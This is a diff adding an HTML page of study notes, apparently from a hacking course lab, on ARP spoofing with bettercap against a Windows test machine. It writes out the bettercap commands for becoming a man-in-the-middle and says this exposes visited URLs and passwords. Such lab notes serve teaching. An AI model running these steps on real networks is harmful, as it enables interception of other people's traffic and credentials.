@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body {
+            height: 100%;
+            width: 100%;
+            background: #f5f6fa;
+        }
+
+        div {
+            color: #67727e;
+            font-size: 20px;
+            padding-left: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div>
+        11…40<br><br>
+
+        Arpspoofing using bettercap<br>
+        -: we can see all the URLS and all the website they visit<br>
+        -: we can see post, password or anything that happens<br><br>
+
+        Inside bettercap tool<br>
+        We write <br>
+        help arp.spoof<br><br>
+
+        arp.spoof.fullduplex - both the router and target will be spoofed if you set it true<br><br>
+
+        Type this in bettercap tool<br><br>
+        set arp.spoof.fullduplex true. ( if there is no error then its working)<br>
+
+        If you want to target more than one ip you can use comma<br><br>
+        set arp.spoof.targets   10.0.2.7        ( target is my windows machine)<br>
+
+        arp.spoof on. ( if it gives no error then its fine)<br><br>
+
+        Now if you press help<br>
+        help<br><br>
+
+        You will see arp.spoof is on<br>
+        net.profe and net.recon should be on<br><br>
+
+        So this commands will bring my kali machine to middle<br><br>
+
+        Now if you go in windows machine<br>
+        Press arp -a <br><br>
+
+        The router address in windows machine will be equal to kali ether address if you do ifconfig<br>
+
+
+
+    </div>
+</body>
+
+</html>
